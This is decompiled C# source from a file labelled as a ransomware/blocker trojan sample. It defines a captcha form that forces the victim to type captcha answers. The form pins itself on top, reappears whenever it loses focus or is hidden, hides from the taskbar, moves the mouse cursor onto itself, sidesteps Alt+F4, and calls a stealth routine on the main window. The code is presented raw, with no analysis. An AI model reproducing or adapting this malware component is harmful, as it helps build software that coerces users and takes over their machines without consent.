// Decompiled with JetBrains decompiler
// Type: SC_aio.captcha
// Assembly: SCaio, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4039BEB0-723F-44D4-B6A2-6115173D2A3D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.asho-8d599606a9e08d397b994f3c1f6ab611585cb198.exe

using Microsoft.VisualBasic.CompilerServices;
using SC_aio.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace SC_aio
{
  [DesignerGenerated]
  public class captcha : Form
  {
    private IContainer components;
    [AccessedThroughProperty("capimg")]
    private PictureBox _capimg;
    [AccessedThroughProperty("capres")]
    private TextBox _capres;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    private bool clicked;
    private bool active;
    private int donotshow;

    public captcha()
    {
      this.KeyDown += new KeyEventHandler(this.captcha_KeyDown);
      this.Leave += new EventHandler(this.captcha_Leave);
      this.Load += new EventHandler(this.captcha_Load);
      this.LostFocus += new EventHandler(this.captcha_LostFocus);
      this.VisibleChanged += new EventHandler(this.captcha_VisibleChanged);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.capimg = new PictureBox();
      this.capres = new TextBox();
      this.Button1 = new Button();
      this.Timer1 = new Timer(this.components);
      ((ISupportInitialize) this.capimg).BeginInit();
      this.SuspendLayout();
      PictureBox capimg1 = this.capimg;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      capimg1.Location = point2;
      this.capimg.Name = "capimg";
      PictureBox capimg2 = this.capimg;
      Size size1 = new Size(120, 40);
      Size size2 = size1;
      capimg2.Size = size2;
      this.capimg.TabIndex = 0;
      this.capimg.TabStop = false;
      TextBox capres1 = this.capres;
      point1 = new Point(12, 57);
      Point point3 = point1;
      capres1.Location = point3;
      this.capres.Name = "capres";
      TextBox capres2 = this.capres;
      size1 = new Size(83, 20);
      Size size3 = size1;
      capres2.Size = size3;
      this.capres.TabIndex = 1;
      Button button1_1 = this.Button1;
      point1 = new Point(101, 55);
      Point point4 = point1;
      button1_1.Location = point4;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(31, 23);
      Size size4 = size1;
      button1_2.Size = size4;
      this.Button1.TabIndex = 2;
      this.Button1.Text = "Go";
      this.Button1.UseVisualStyleBackColor = true;
      this.Timer1.Interval = 500;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(140, 84);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.capres);
      this.Controls.Add((Control) this.capimg);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (captcha);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Solve";
      this.TopMost = true;
      ((ISupportInitialize) this.capimg).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual PictureBox capimg
    {
      get => this._capimg;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._capimg = value;
    }

    internal virtual TextBox capres
    {
      get => this._capres;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.capres_TextChanged);
        KeyEventHandler keyEventHandler = new KeyEventHandler(this.capres_KeyDown);
        if (this._capres != null)
        {
          this._capres.TextChanged -= eventHandler;
          this._capres.KeyDown -= keyEventHandler;
        }
        this._capres = value;
        if (this._capres == null)
          return;
        this._capres.TextChanged += eventHandler;
        this._capres.KeyDown += keyEventHandler;
      }
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    public object solve(string url)
    {
      if (MyProject.Forms.aio.autocontrolled)
        this.Timer1.Start();
      this.active = true;
      this.clicked = false;
      this.capres.Text = "";
      this.showme();
      this.capres.Focus();
      this.capimg.ImageLocation = url;
      while (!this.clicked)
        Application.DoEvents();
      this.active = false;
      if (MyProject.Forms.aio.autocontrolled)
        this.Timer1.Stop();
      this.capimg.Image = (Image) null;
      this.Hide();
      return (object) this.capres.Text;
    }

    private void submitit()
    {
      if (this.capres.Text.Length <= 3)
        return;
      this.clicked = true;
    }

    private void showme()
    {
      if (this.donotshow == 0)
      {
        MyProject.Forms.aio.stealth();
        this.Show();
        this.BringToFront();
        this.Opacity = 100.0;
        this.ShowInTaskbar = false;
        if (!this.Button1.Focused)
          this.capres.Focus();
        if (MyProject.Forms.aio.autocontrolled)
          this.FormBorderStyle = FormBorderStyle.None;
        Cursor.Position = new Point(checked (this.Location.X + 15), checked (this.Location.Y + 65));
      }
      else
        checked { --this.donotshow; }
    }

    private void avoidaltf4(KeyEventArgs e)
    {
      if (e.KeyCode != Keys.F4)
        return;
      this.donotshow = 5;
      this.Hide();
    }

    private void captcha_KeyDown(object sender, KeyEventArgs e) => this.avoidaltf4(e);

    private void captcha_Leave(object sender, EventArgs e)
    {
      if (!(MyProject.Forms.aio.autocontrolled & this.active))
        return;
      this.showme();
    }

    private void captcha_Load(object sender, EventArgs e)
    {
    }

    private void Button1_Click(object sender, EventArgs e) => this.submitit();

    private void captcha_LostFocus(object sender, EventArgs e)
    {
      if (!(MyProject.Forms.aio.autocontrolled & this.active))
        return;
      this.showme();
    }

    private void captcha_VisibleChanged(object sender, EventArgs e)
    {
      if (!(MyProject.Forms.aio.autocontrolled & this.active))
        return;
      this.showme();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (!(MyProject.Forms.aio.autocontrolled & this.active))
        return;
      this.showme();
    }

    private void capres_KeyDown(object sender, KeyEventArgs e)
    {
      if (e.KeyCode == Keys.Return)
        this.submitit();
      else
        this.avoidaltf4(e);
    }

    private void capres_TextChanged(object sender, EventArgs e)
    {
    }
  }
}
